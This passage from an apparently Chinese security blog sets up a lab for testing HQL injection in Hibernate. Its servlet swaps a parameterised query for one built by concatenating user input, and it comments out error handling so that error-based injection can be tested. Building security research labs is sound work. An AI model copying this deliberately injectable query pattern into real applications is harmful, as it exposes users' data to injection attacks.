</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Session</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HibernateUtil</span><span class="p">.</span><span class="na">getSessionFactory</span><span class="p">().</span><span class="na">openSession</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">session</span><span class="p">.</span><span class="na">beginTransaction</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="s">&#34;Hibernate Version: 5.6.15.Final\n\n&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            Query&lt;User&gt; query = session.createQuery(&#34;FROM User WHERE name = :parameter&#34;, User.class);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            query.setParameter(&#34;name&#34;, parameter);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Query</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">createQuery</span><span class="p">(</span><span class="s">&#34;from User where name=&#39;&#34;</span><span class="o">+</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="o">+</span><span class="s">&#34;&#39;&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">User</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">query</span><span class="p">.</span><span class="na">uniqueResult</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">user</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;com.example.User found: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;, Email: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getEmail</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;No user found with name: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">parameter</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">session</span><span class="p">.</span><span class="na">getTransaction</span><span class="p">().</span><span class="na">commit</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        } catch (Exception e) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            if (session.getTransaction() != null) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                session.getTransaction().rollback();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            out.println(&#34;Error: &#34; + e.getMessage());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">session</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>注意在测试报错注入时，建议把 catch 部分代码注释。</p>
<h4 id="user类" class="heading-element"><span>user类</span>
  <a href="#user%e7%b1%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.persistence.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Entity</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Table</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;users&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">User</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Id</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@GeneratedValue</span><span class="p">(</span><span class="n">strategy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GenerationType</span><span class="p">.</span><span class="na">IDENTITY</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Column</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;name&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Column</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;email&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">email</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getId</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setId</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getEmail</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">email</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setEmail</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">email</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">email</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="hibernateutil类" class="heading-element"><span>HibernateUtil类</span>
  <a href="#hibernateutil%e7%b1%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.SessionFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.hibernate.cfg.Configuration</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HibernateUtil</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">SessionFactory</span><span class="w"> </span><span class="n">sessionFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buildSessionFactory</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">SessionFactory</span><span class="w"> </span><span class="nf">buildSessionFactory</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Configuration</span><span class="p">().</span><span class="na">configure</span><span class="p">().</span><span class="na">buildSessionFactory</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ExceptionInInitializerError</span><span class="p">(</span><span class="n">ex</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">SessionFactory</span><span class="w"> </span><span class="nf">getSessionFactory</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sessionFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="hibernatecfgxml配置文件" class="heading-element"><span>hibernate.cfg.xml配置文件</span>
  <a href="#hibernatecfgxml%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;hibernate-configuration&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;session-factory&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- Database connection settings --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.driver_class&#34;</span><span class="nt">&gt;</span>com.mysql.cj.jdbc.Driver<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.url&#34;</span><span class="nt">&gt;</span>jdbc:mysql://localhost:3306/test<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.username&#34;</span><span class="nt">&gt;</span>root<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.connection.password&#34;</span><span class="nt">&gt;</span>password<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- SQL dialect --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.dialect&#34;</span><span class="nt">&gt;</span>org.hibernate.dialect.MySQL8Dialect<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- Echo all executed SQL to stdout --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.show_sql&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.format_sql&#34;</span><span class="nt">&gt;</span>true<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- Drop and re-create the database schema on startup --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;hibernate.hbm2ddl.auto&#34;</span><span class="nt">&gt;</span>update<span class="nt">&lt;/property&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 显式声明实体类 --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;mapping</span> <span class="na">class=</span><span class="s">&#34;com.example.User&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/session-factory&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/hibernate-configuration&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="webxml" class="heading-element"><span>web.xml</span>
  <a href="#webxml" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">xmlns=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee
</span></span></span><span class="line"><span class="cl"><span class="s">         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">version=</span><span class="s">&#34;3.1&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="pomxml" class="heading-element"><span>pom.xml</span>
  <a href="#pomxml" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.example<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>HQL_Test<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;name&gt;</span>Archetype - HQL_Test<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;url&gt;</span>http://maven.apache.org<span class="nt">&lt;/url&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;packaging&gt;</span>war<span class="nt">&lt;/packaging&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Hibernate Core --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>org.hibernate<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>hibernate-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>5.6.15.Final<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- MySQL Connector --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>mysql<span class="nt">&lt;/groupId&gt;</span>
